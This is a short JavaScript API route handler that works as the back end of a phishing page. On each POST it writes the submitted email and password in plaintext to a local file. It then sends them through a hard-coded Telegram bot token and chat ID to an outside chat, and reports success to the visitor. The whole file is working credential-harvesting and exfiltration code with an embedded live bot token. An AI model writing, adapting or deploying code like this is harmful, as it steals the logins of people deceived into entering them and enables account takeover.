const fs = require('fs');
const path = require('path');

export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { email, password } = req.body;

        // Save credentials to a file
        const filePath = path.join(process.cwd(), 'username.txt');
        const data = `Email: ${email}, Password: ${password}\n`;
        fs.appendFileSync(filePath, data);

        // Send credentials to Telegram bot
        const telegramBotToken = '8159292912:AAGhCvnSWDPw545joH4Jz_N1sM94J425Zwo';
        const chatId = '7587120060'; // Replace with your actual chat ID
        const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;

        await fetch(telegramUrl);

        res.status(200).json({ success: true });
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
}
